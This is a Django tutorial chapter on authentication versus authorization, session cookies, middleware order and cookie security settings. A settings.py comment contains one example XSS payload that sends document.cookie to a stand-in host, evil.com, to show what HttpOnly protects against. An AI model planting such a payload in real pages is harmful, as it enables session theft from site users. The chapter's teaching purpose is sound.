# Auth Basics — Authentication vs Authorization

> **The main question:** Who are you, and what are you allowed to do?
>
> These two questions are the foundation of any security system.
> Django answers them through two different systems.

---

## Analogy — a passport and a concert ticket

- **Passport** = **Authentication (AuthN)**: "Who are you?" — confirms identity.
  A security guard checks the document and makes sure it is genuine.
- **Ticket** = **Authorization (AuthZ)**: "Where are you allowed to go?" — defines permissions.
  The usher checks the ticket and decides where you can sit (VIP or the stalls).

At an airport: security checks your passport (AuthN), then your boarding pass (AuthZ).
A passport without a ticket — you won't be let in. A ticket without a passport — same thing.

---

## Table: AuthN vs AuthZ

| | Authentication (AuthN) | Authorization (AuthZ) |
|--|------------------------|---------------------|
| **Question** | Who are you? | What are you allowed to do? |
| **Answer** | Password check | Permission check on an object |
| **Django tool** | `authenticate()`, `login()` | `@login_required`, `get_object_or_404` |
| **Where it is checked** | `AuthenticationMiddleware` | Separately in each view |
| **What if it fails** | A form with an error | 302 Redirect or 404/403 |

---

## Django Auth components

```python
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required

# 1. Check credentials (AuthN):
user = authenticate(request, username='alice', password='secret')
# → Django: looks up the User with username='alice'
# → Checks the PBKDF2 password hash in the DB
# → Returns the User object if it matches, or None

# 2. Start a session after a successful login:
if user is not None:
    login(request, user)   # ← creates a session_id in the DB + a cookie in the browser
    # Now request.user = alice in all subsequent requests

# 3. End the session:
logout(request)   # ← deletes the session record from the DB + forcibly clears the cookie
```

---

## Middleware chain: who sets `request.user`

Every HTTP request passes through the WHOLE middleware chain before it reaches the view. In `notes_chat_app` it looks like this:

```
Every request passes through the WHOLE middleware chain (settings.py → MIDDLEWARE):

1. DebugExceptionMiddleware  — the project's own middleware (notes_project/middleware.py),
                               added only when DEBUG=True: shows a traceback in dev
2. SecurityMiddleware        — HTTPS redirect, HTTP security headers
3. DebugToolbarMiddleware    — Django Debug Toolbar
4. SessionMiddleware         — reads Cookie: sessionid=... → loads the session from the DB
5. CommonMiddleware          — trailing slash, Content-Type
6. CsrfViewMiddleware        — checks csrfmiddlewaretoken in POST requests
7. AuthenticationMiddleware  — reads the session → sets request.user
   │                           If there is a session → request.user = User(id=42)
   │                           If not                → request.user = AnonymousUser
8. MessageMiddleware         — Django messages flash framework
9. XFrameOptionsMiddleware   — X-Frame-Options: DENY header
   │
   ▼
View function (request.user is already set!)
```

**Middleware order matters:**

- `SessionMiddleware` must come before `AuthenticationMiddleware` — Auth reads the session
- `CsrfViewMiddleware` before the view — it checks CSRF before any view is called
- By default `CsrfViewMiddleware` keeps its secret in the `csrftoken` cookie, not in the session; `SessionMiddleware` must come before it only when `CSRF_USE_SESSIONS = True`

In `crispy_notes_project` the middleware chain is shorter (without DebugExceptionMiddleware and DebugToolbarMiddleware), but the principle is the same.

---

## `@login_required` — what it does and where it lives

```python
# notes_app/views.py
from django.contrib.auth.decorators import login_required

@login_required   # ← a decorator, checks request.user.is_authenticated
def note_list(request):
    # If request.user = AnonymousUser:
    #   → redirect to LOGIN_URL (settings.py) + ?next=/notes/
    #   → 302 /accounts/login/?next=/notes/
    # If request.user = User(id=42):
    #   → runs the view normally
    notes = selectors.get_user_notes(request.user)
    return render(request, 'notes_app/note_list.html', {'notes': notes})
```

```python
# settings.py — where to redirect users who are not logged in:
LOGIN_URL = '/accounts/login/'
LOGIN_REDIRECT_URL = '/notes/'           # where to go AFTER a successful login
LOGOUT_REDIRECT_URL = '/accounts/login/' # where to go AFTER logging out
```

> **Important:** `@login_required` is only AuthN ("are you logged in?").
> It does NOT check whether this particular note belongs to you.
> That requires a separate AuthZ step in the view (see [Object Permissions](object_permissions.md)).

---

## Sessions — how Django remembers the user

> **Problem:** HTTP is a stateless protocol. Every request is as if it were "the first".
> The server does not know who you are unless you send proof.

### Analogy — a café loyalty card

Imagine a café where you earn points for every coffee. Without a card, the waiter forgets you after every visit. With a card, the points add up.

**Session cookie = the loyalty card**: the browser stores it and automatically presents it with every request.

### Step-by-step flow: Login → Cookie → Next request

```
STEP 1: Alice clicks "Log in"
─────────────────────────────────────────────────────────────────────────
Browser:  POST /accounts/login/  {username: 'alice', password: 'secret'}
Django:   CsrfViewMiddleware → checks csrfmiddlewaretoken ✓
          authenticate('alice', 'secret') → User(id=42) ✓
          login(request, user)
            → INSERT INTO django_session
              (session_key='xK9mPq', session_data={_auth_user_id: 42}, expire_date=...)
          Response:  302 /notes/
          Header:    Set-Cookie: sessionid=xK9mPq; HttpOnly; SameSite=Lax; Path=/

STEP 2: The browser stores the cookie. Alice sees /notes/
─────────────────────────────────────────────────────────────────────────
Browser stores: sessionid=xK9mPq (in the browser's protected storage)

STEP 3: Alice's next request (GET /notes/)
─────────────────────────────────────────────────────────────────────────
Browser:  GET /notes/
Header:   Cookie: sessionid=xK9mPq   ← sent automatically!
          Django SessionMiddleware:
            SELECT * FROM django_session WHERE session_key='xK9mPq'
            → session_data = {_auth_user_id: 42}
          Django AuthenticationMiddleware:
            SELECT * FROM auth_user WHERE id=42
            → request.user = User(id=42, username='alice')
View:     @login_required → request.user.is_authenticated → True ✓
          notes = selectors.get_user_notes(request.user)
          → SQL: SELECT * FROM note WHERE user_id=42 OR group_id IN (...)

STEP 4: Logout
─────────────────────────────────────────────────────────────────────────
Browser:  POST /accounts/logout/  (with the CSRF token in the POST body)
Django:   logout(request)
            → DELETE FROM django_session WHERE session_key='xK9mPq'
          Response:  302 /accounts/login/
          Header:    Set-Cookie: sessionid=; expires=Thu, 01 Jan 1970 00:00:00 GMT
Browser:  Deletes the cookie. request.user → AnonymousUser.
```

### The cookie in DevTools: how to see the session

```
Chrome DevTools → Application → Storage → Cookies → http://localhost

Field         Value
─────────────────────────────────────────────────
Name          sessionid
Value         xK9mPq...  (a 32-character random key)
Domain        localhost
Path          /
Expires       (in 2 weeks by default)
Size          ~100 B
HttpOnly      ✓  (JS cannot read it!)
SameSite      Lax

Try it in the Console:
  document.cookie  →  'csrftoken=abc123'
  (sessionid is missing — HttpOnly!)
```

### Cookie settings in settings.py

```python
# settings.py:

SESSION_COOKIE_HTTPONLY = True
# ↑ JS cannot read sessionid via document.cookie
#   Protection against XSS attacks that try to steal the cookie:
#   <script>fetch('evil.com?c='+document.cookie)</script>
#   → with HttpOnly: sessionid is missing from document.cookie → the attack gets nothing

SESSION_COOKIE_SAMESITE = "Lax"
# ↑ "Lax": the cookie is sent only from the same site OR
#   on top-level navigation GET requests (links)
#   Protection against CSRF: evil.com cannot send a POST with your cookie
#   "Strict" — stricter: the cookie is not sent even when following links from external sites
#   "None" — unsafe without the Secure (HTTPS) flag

CSRF_COOKIE_HTTPONLY = False
# ↑ False: JS can read csrftoken (needed for fetch/axios requests with a CSRF header)
#   If you don't use JS for forms → True for strict protection

# Production HTTPS (uncomment when you have an SSL certificate):
# SESSION_COOKIE_SECURE = True   # cookie only over HTTPS (not HTTP)
# CSRF_COOKIE_SECURE = True
```

> **HttpOnly and XSS:** even if an attacker injects a `<script>` into the page and tries to steal the session cookie via `document.cookie`, they will get an empty string or only `csrftoken`. `sessionid` will not be in the result, because `HttpOnly` forbids JS from reading this cookie.

---

## Next

Next chapter: [Password Security](password_security.md) — Password Reset flow, PBKDF2, Password Validators, Password Change.
